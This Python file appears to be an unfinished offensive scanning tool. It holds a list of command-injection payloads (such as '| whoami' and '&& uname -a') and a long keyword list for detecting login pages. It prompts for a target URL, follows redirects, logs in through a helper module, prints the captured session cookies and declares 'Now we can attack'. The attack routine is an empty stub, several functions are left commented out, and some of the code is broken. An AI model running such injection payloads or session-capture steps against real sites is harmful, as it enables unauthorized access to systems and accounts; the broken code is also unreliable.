import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import html_field_finder

payloads = [
    "| whoami",
    "&& whoami",
    "| id",
    "| uname -a",
    "&& uname -a"
]

html_check_list = [
    "login", "log-in", "log_in", "signin", "sign-in", "sign_in",
    "username", "user", "userid", "user-id", "user_name", "email", "e-mail",
    "password", "pass", "pwd", "passwd",
    "auth", "authenticate", "authentication", "credentials",
    "account", "access", "member", "membership",
    "connect", "connexion", "session", "startsession",
    "secure", "admin", "administrator", "portal",
    "token", "userlogin", "user-signin", "password_field",
    "continue", "submit", "enter", "proceed",
    "dashboard", "panel", "signon", "sign_on",
    "input type=\"password\"", "input name=\"password\"",
    "input id=\"password\"", "input type='password'",
    "remember me", "forgot password", "reset password",
    "form-login", "form_signin", "login-form", "auth-form",
    "access account", "clientlogin", "stafflogin", "adminlogin",
    "loginbutton", "signinbutton", "submitlogin",
    "input name=\"username\"", "input id=\"username\"",
    "input name='username'", "input id='username'",
    "login to your account", "sign in to your account",
    "تسجيل الدخول",  # Arabic
    "connexion",  # French
    "anmelden",  # German
    "ログイン",  # Japanese
    "로그인",  # Korean
    "登录",  # Chinese
    "вход",  # Russian
]

# def redirection_scanner():
#     url = input("Who is the target (http://example.com/page):").strip()
#     redir_url = url_compare(url)
#     if redir_url and check_login(redir_url):
#         # html_field_finder.login_to_site(redir_url)
#         # if check_login(html_field_finder.last_responce):
#         cookies, session, response_text = html_field_finder.login_to_site(redir_url)
#         if cookies:
#             # print(response_text)
#             print(cookies)
#             print("[+++] Now we can attack...")
#             return url
#         else:
#             print("[!] Login failed.")
#     else:
#         return url


def redirection_scanner():
    url = input("Who is the target (http://example.com/page):").strip()
    redir_url = url_compare(url)

    if redir_url and check_login(redir_url):
        cookies, session = html_field_finder.login_to_site(redir_url)
        # , response_text 
        if cookies:
            print(cookies)
            print("[+++] Now we can attack...")
            return url, session
        else:
            print("[!] Login failed.")
            return None, None
    else:
        return url, None

            




            

# def redirection_scanner():
#     url = input("Who is the target (http://example.com/page):").strip()
#     redir = url_compare(url)

#     if not redir:
#         return

#     # 1. بار اول با کوکی تست می‌کنیم
#     session = html_field_finder.load_session()
#     response = session.get(url)

#     # 2. بررسی می‌کنیم آیا کوکی کار می‌کنه
#     if check_login(response.text):
#         print("[*] Session invalid or not logged in. Logging in again...")
#         session = html_field_finder.login_to_site(redir)  # ← باید session رو برگردونه
#         response = session.get(url)

#     if not check_login(response.text):
#         print("[!] Login failed. Cannot continue.")
#         return

#     print("[+++] Now we can attack with valid session!")
#     # attack(session, url) ← اینجا حمله انجام بده با session


# def load_session():
#     session = requests.Session()
#     try:
#         with open("cookies.pkl", "rb") as f:
#             session.cookies.update(pickle.load(f))
#         print("[*] Loaded session from saved cookies.")
#     except FileNotFoundError:
#         print("[!] No saved cookies found.")
#     return session


    




def url_compare(url_c):
    print("comparing url...")
    if "http" in url_c:
        final_url = requests.get(url_c, allow_redirects=True)
    
    if url_c == final_url.url:
        print("There is no redirection")
        return 0
    else:
        print(f"We had redirection from {url_c} to {final_url.url}")
        return final_url.url



def check_login(html):
    print("checking the html of redirect url...")
    return any(tag in html.lower() for tag in html_check_list)


# def copy_cookie():
    print(html_field_finder.cookie_dict)


# def attack():


# if __name__ == "__main__":
#     redirection_scanner()